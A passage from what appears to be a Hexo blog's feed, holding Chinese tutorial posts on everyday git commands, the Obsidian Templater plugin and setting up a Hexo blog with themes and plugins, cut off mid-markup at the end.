    <content type="html"><![CDATA[<h2 id="拉取远程分支并创建本地分支"><a href="#拉取远程分支并创建本地分支" class="headerlink" title="拉取远程分支并创建本地分支"></a>拉取远程分支并创建本地分支</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 660">      &#125; else &#123;<br><br>        listener.Status.Reason = &quot;&quot;<br><br>        logger.Info(msg + &quot; GetLoadBalancer ok&quot;, &quot;listener&quot;, key, &quot;lb id&quot;, listener.Spec.LoadbalancerId)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用该方式会在本地新建分支x，并自动切换到该本地分支x</span><br>git checkout -b 本地分支名x origin/远程分支名x<br>git checkout -b master origin/master<br><br><span class="hljs-comment"># dev合并到master</span><br>处于master分支<br>git merge origin/dev  <span class="hljs-comment"># merge到本地的master</span><br>git push <br><br><span class="hljs-comment"># 远程新建了一个分支feature，想在本地也建一个feature分支，但是在本地git branch -a的时候发现没有这个远程的origin/feature分支，怎么办？</span><br>1.首先将某个远程主机的更新，全部取回本地：git fetch<br>2.再次查看远程分支：git branch -a 发现远程的分支已经可以看见了。<br>3.然后拉取远程分支到本地：git checkout -b 远程分支名 origin/远程分支名<br><br><br><span class="hljs-comment"># git强制提交本地分支覆盖远程分支</span><br>git push origin 分支名 --force<br><br><br><span class="hljs-comment"># Git创建远程分支</span><br>假设当前分支为master，需要创建的分支是my-test<br>git checkout -b my-test  //在当前分支下创建my-test的本地分支分支<br>git push origin my-test  //将my-test分支推送到远程<br>git branch --set-upstream-to=origin/my-test //将本地分支my-test关联到远程分支my-test上   <br>git branch -a //查看远程分支 <br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="git打tag"><a href="#git打tag" class="headerlink" title="git打tag"></a>git打tag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># 打标签</span><br>git tag -a v1.4 -m <span class="hljs-string">&quot;my version 1.4&quot;</span><br>git tag v1.4-lw<br>git tag<br>git show v1.4  <span class="hljs-comment"># git show 命令可以看到标签信息和与之对应的提交信息</span><br>git push origin v1.5 <span class="hljs-comment">#将本地v1.5的tag推送到远端服务器</span><br><br></code></pre></td></tr></table></figure><h3 id="git撤回上次commit"><a href="#git撤回上次commit" class="headerlink" title="git撤回上次commit"></a>git撤回上次commit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --soft HEAD^      仅仅是撤回commit操作，写的代码仍然保留。<br>= git reset --soft HEAD~1<br>git reset --soft HEAD~2     如果进行了2次commit，想都撤回<br></code></pre></td></tr></table></figure><h3 id="git撤回上次push"><a href="#git撤回上次push" class="headerlink" title="git撤回上次push"></a>git撤回上次push</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">可以用git <span class="hljs-built_in">log</span> 查看你要回到的那个版本<br><br>接着用<br>git reset --hard HEAD^ 回退到上个版本<br>git reset --hard commit_id 退到/进到 指定commit_id<br><br>最后将本地的修改提交到远程<br>git push origin HEAD --force<br><br><span class="hljs-comment">## 注意，这样子修改，之前commit的信息就没了，本地的也没了，需要提前保存相关信息</span><br><br></code></pre></td></tr></table></figure><h2 id="git建立本地仓库并推送到远程"><a href="#git建立本地仓库并推送到远程" class="headerlink" title="git建立本地仓库并推送到远程"></a>git建立本地仓库并推送到远程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. github新建一个仓库<br><br>1.  **在本地<span class="hljs-built_in">test</span> 项目中使用 git init 把其变成git可以管理的仓库**，  <br>    打开<span class="hljs-built_in">test</span>项目文件夹，右键选择git bash命令行工具，输入：  <br>    **git init**  <br>    就可以把此时的<span class="hljs-built_in">test</span>项目变成git可以管理的仓库<br>    <br>2.  **添加文件夹下所有文件到暂存区**  <br>    可以用命令 git add ‘’filename‘’ 添加**单个文件**  <br>    也可以用命令 **git add . 把**文件夹下所有文件添加到缓存区（注意add和.之间有个空格）<br>    <br>3.  **把文件提交到仓库 ；**  <br>    使用命令行： **git-commit -m “提交描述”**<br>    <br>4.  ****关联远程仓库** **  <br>    使用命令行：git remote add origin 你的远程仓库url地址** ；<br>    <br>5.  **获取远程库与本地同步（远程仓库不为空需要这一步）**  <br>    使用命令行：**git pull --rebase origin master**<br>    <br>6.  **把本地内容推送到远程库** 。  <br>    使用命令行：**git push -u origin master**<br><br></code></pre></td></tr></table></figure><h2 id="强制删除本地分支和远程分支"><a href="#强制删除本地分支和远程分支" class="headerlink" title="强制删除本地分支和远程分支"></a>强制删除本地分支和远程分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 先切换到别的分支: git checkout dev_20180927<br><br>2 删除本地分支： git branch -d dev_20181018<br><br>3 如果删除不了可以强制删除，git branch -D dev_20181018<br><br>4 有必要的情况下，删除远程分支：git push origin --delete dev_20181018<br><br>  <br>  <br>作者：追逐繁星的阿忠  <br>链接：https://www.jianshu.com/p/9fbe77ad1058  <br>来源：简书  <br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><br><br><span class="hljs-meta">## 报错解决</span><br><br><span class="hljs-meta">### git checkout -b  xxx origin/xxx 报错</span><br><br>```bash<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git checkout -b dev_230109 origin/dev_230109</span><br>fatal: <span class="hljs-string">&#x27;origin/dev_230109&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a commit <span class="hljs-keyword">and</span> a branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> cannot be created <span class="hljs-keyword">from</span> it<br><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>* anwy-dev<br>  anwy-test<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br><br><br><span class="hljs-meta">## 解决办法</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git pull</span><br>remote: Enumerating objects: <span class="hljs-number">39</span>, done.<br>remote: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">39</span>/<span class="hljs-number">39</span>), done.<br>remote: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">35</span>/<span class="hljs-number">35</span>), done.<br>remote: Total <span class="hljs-number">39</span> (delta <span class="hljs-number">12</span>), reused <span class="hljs-number">0</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">0</span><br>Unpacking objects: <span class="hljs-number">100</span>% (<span class="hljs-number">39</span>/<span class="hljs-number">39</span>), done.<br>From http:<span class="hljs-comment">//gitlab.tianti.tg.unicom.local/cloudStorage/tgStack/dubhe</span><br> * [<span class="hljs-keyword">new</span> branch]      dev_230109 -&gt; origin/dev_230109<br>Already up to date.<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>* anwy-dev<br>  anwy-test<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git checkout -b dev_230109 origin/dev_230109</span><br>M       Makefile<br>M       config/cuk-config.cue<br>D       config/kubeconfig-n2<br>M       config/regionConfig.yaml<br>M       go.mod<br>M       go.sum<br>M       pkg/utils/common_vars_insert.go<br>M       pkg/utils/common_vars_insert_test.go<br>Branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> <span class="hljs-keyword">set</span> up to track remote branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;origin&#x27;</span>.<br>Switched to a <span class="hljs-keyword">new</span> branch <span class="hljs-string">&#x27;dev_230109&#x27;</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>  anwy-dev<br>  anwy-test<br>* dev_230109<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br><br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/811b07b129e8"># git同步远程仓库分支</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】04.obsidian如何插入模板？插件：templater</title>
    <link href="/2022/12/11/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9104.obsidian%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E6%A8%A1%E6%9D%BF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Atemplater/"/>
    <url>/2022/12/11/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9104.obsidian%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E6%A8%A1%E6%9D%BF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Atemplater/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我在使用github.io创作自己的博客，使用了hexo主题，hexo主题需要有一些元数据才能正确的识别，想通过obsidian的模板插件来定制一个专属于hexo元数据的模板。</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>打开插件<br>左下角设置 –&gt; 第三方插件 –&gt; 社区插件市场，搜索：templater</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182120.png" alt="image.png"></p><p>点击安装，然后启用。</p><h3 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h3><p>在仓库下新建一个文件夹，随意取名</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182213.png" alt="image.png"></p><p>在插件的配置处，将刚刚的文件夹填上。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182311.png" alt="image.png"></p><h3 id="定制模板"><a href="#定制模板" class="headerlink" title="定制模板"></a>定制模板</h3><p>定制一个hexo的元数据模板</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182435.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> &lt;%<span class="language-ruby"> tp.file.title </span>%&gt;<br><span class="hljs-attr">author:</span> <span class="hljs-string">ningan123</span><br><span class="hljs-attr">date:</span> &lt;%<span class="language-ruby"> tp.file.creation_date() </span>%&gt;<br><span class="hljs-attr">updated:</span> &lt;%<span class="language-ruby"> tp.file.last_modified_date() </span>%&gt;<br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h3 id="新建笔记"><a href="#新建笔记" class="headerlink" title="新建笔记"></a>新建笔记</h3><p>此处选择一个之前就创建的笔记，点击左侧templater的模板，选择刚刚建的模板hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182702.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182729.png" alt="image.png"></p><p>可以看到，已经动态生成了模板数据<br>之所以要选择之前就建好的笔记，是因为想体现出插件的creation_date和last_modified_date的区别。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182754.png" alt="image.png"></p><p>还可以定制其他自己想要的数据，可以到<a href="https://silentvoid13.github.io/Templater/">Templater</a>进行查看其他语法的生成。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://silentvoid13.github.io/Templater/">Templater</a></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【hexo系列】02.hexo和obsidian实现笔记丝滑</title>
    <link href="/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/"/>
    <url>/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/</url>
    
    <content type="html"><![CDATA[<h2 id="hexo主题"><a href="#hexo主题" class="headerlink" title="hexo主题"></a>hexo主题</h2><p><a href="https://hexo.io/themes/">hexo主题大全</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> blog<br>git <span class="hljs-built_in">clone</span> https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo<br></code></pre></td></tr></table></figure><p>这是将3-hexo主题下载到blog目录的themes主题下的3-hexo文件夹中。</p><p>打开博客目录下的_config.yml配置文件，修改主题为3-hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210215012.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br>hexo g<br>hexo d<br></code></pre></td></tr></table></figure><p>效果如下：<br>(修改了部分配置数据，没有在博客里写出来)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210215159.png"></p><h2 id="hexo进阶"><a href="#hexo进阶" class="headerlink" title="hexo进阶"></a>hexo进阶</h2><h3 id="hexo插件：自动生成目录"><a href="#hexo插件：自动生成目录" class="headerlink" title="hexo插件：自动生成目录"></a>hexo插件：自动生成目录</h3><p>想要自动生成目录</p><p>原始的文章目录格式如下，文章的原数据如下右</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210230720.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">npm install hexo-auto-category <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><p>配置 Hexo <code>_config.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Generate categories from directory-tree</span><br><span class="hljs-comment"># Dependencies: https://github.com/xu-song/hexo-auto-category</span><br><span class="hljs-comment"># depth: the max_depth of directory-tree you want to generate, should &gt; 0</span><br>auto_category:<br> <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br> depth:<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地预览</span><br>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s<br><span class="hljs-comment"># github</span><br>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br></code></pre></td></tr></table></figure><p>可以看到categories目录已经自动添加上了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210231121.png"></p><h3 id="hexo插件：自动生成目录序号（自行选用）"><a href="#hexo插件：自动生成目录序号（自行选用）" class="headerlink" title="hexo插件：自动生成目录序号（自行选用）"></a>hexo插件：自动生成目录序号（自行选用）</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210232941.png"></p><p>配置 Hexo <code>_config.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 插件 hexo-heading-index 自动生成标题序号</span><br>heading_index:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  index_styles: <span class="hljs-string">&quot;&#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125;&quot;</span><br>  connector: <span class="hljs-string">&quot;.&quot;</span><br>  global_prefix: <span class="hljs-string">&quot;&quot;</span><br>  global_suffix: <span class="hljs-string">&quot;. &quot;</span><br>  start_level: 1<br>  allow_html: <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210235534.png"></p><h3 id="obsidian插件：templater"><a href="#obsidian插件：templater" class="headerlink" title="obsidian插件：templater"></a>obsidian插件：templater</h3><h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><p>打开插件<br>左下角设置 –&gt; 第三方插件 –&gt; 社区插件市场，搜索：templater</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182120.png" alt="image.png"></p><p>点击安装，然后启用。</p><h4 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h4><p>在仓库下新建一个文件夹，随意取名</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182213.png" alt="image.png"></p><p>在插件的配置处，将刚刚的文件夹填上。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182311.png" alt="image.png"></p><h4 id="定制模板"><a href="#定制模板" class="headerlink" title="定制模板"></a>定制模板</h4><p>定制一个hexo的元数据模板</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182435.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> &lt;%<span class="language-ruby"> tp.file.title </span>%&gt;<br><span class="hljs-attr">author:</span> <span class="hljs-string">ningan123</span><br><span class="hljs-attr">date:</span> &lt;%<span class="language-ruby"> tp.file.creation_date() </span>%&gt;<br><span class="hljs-attr">updated:</span> &lt;%<span class="language-ruby"> tp.file.last_modified_date() </span>%&gt;<br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h4 id="新建笔记"><a href="#新建笔记" class="headerlink" title="新建笔记"></a>新建笔记</h4><p>此处选择一个之前就创建的笔记，点击左侧templater的模板，选择刚刚建的模板hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182702.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182729.png" alt="image.png"></p><p>可以看到，已经动态生成了模板数据<br>之所以要选择之前就建好的笔记，是因为想体现出插件的creation_date和last_modified_date的区别。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182754.png" alt="image.png"></p><p>还可以定制其他自己想要的数据，可以到<a href="https://silentvoid13.github.io/Templater/">Templater</a>进行查看其他语法的生成。</p><p>搭配刚刚hexo动态生成目录的插件，可以实现元数据自动化，是不是爽歪歪~—</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/xu-song/hexo-auto-category"># hexo-auto-category</a><br><a href="https://github.com/r12f/hexo-heading-index">hexo-heading-index</a><br><a href="https://silentvoid13.github.io/Templater/">Templater</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【hexo系列】01.hexo环境搭建及github.io搭建</title>
    <link href="/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="基础环境要求"><a href="#基础环境要求" class="headerlink" title="基础环境要求"></a>基础环境要求</h2><p>检测Node.js是否安装成功，在命令行中输入 node -v<br>检测npm是否安装成功，在命令行中输入npm -v<br>因为我之前安装过</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210135641.png"></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span><br>npm install -g hexo-cli<br><span class="hljs-comment"># 安装之后验证</span><br>hexo --version<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210140201.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210140817.png"></p><h2 id="hexo初体验"><a href="#hexo初体验" class="headerlink" title="hexo初体验"></a>hexo初体验</h2><p>我的笔记根目录是 E:\SynologyDrive</p><h3 id="创建hexo工程"><a href="#创建hexo工程" class="headerlink" title="创建hexo工程"></a>创建hexo工程</h3><p>方法1：在根目录下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init blog<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141059.png"></p><p>就能看到生成了一个叫blog的文件夹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141234.png"></p><p>方法2：新建一个blog文件夹(自己更改为自己的名字)</p><p>进到blog文件夹下面，执行：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141358.png"></p><p>这两个的效果是一样的，执行之后就会看到blog文件夹下面拉取了git上面的东西，具体如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141459.png"></p><h3 id="初体验"><a href="#初体验" class="headerlink" title="初体验"></a>初体验</h3><p>source&#x2F;_posts 文章文件夾</p><p>打开该文件夹，可以看到下面有一个叫hello-world.md的文档</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142337.png"></p><p>启动hexo server：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142451.png"></p><p>在浏览器访问这个网址：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142606.png"></p><p>就能看到上面的页面啦~</p><h3 id="创建自己的第一篇笔记"><a href="#创建自己的第一篇笔记" class="headerlink" title="创建自己的第一篇笔记"></a>创建自己的第一篇笔记</h3><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新建一篇文章</span><br>hexo new <span class="hljs-string">&quot;first&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142757.png"></p><p>可以在 source&#x2F;_posts 文件夹下看到刚刚新建的文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142851.png"></p><p>在笔记中添加一些内容，并查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;first article&quot;</span> &gt;&gt; first.md<br><span class="hljs-built_in">cat</span> .\first.md<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143111.png"></p><p>在博客根目录下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成静态网页</span><br>hexo generate<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143352.png"></p><p>启动hexo server： (如果刚刚server一直在运行，这一步就不用操作了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 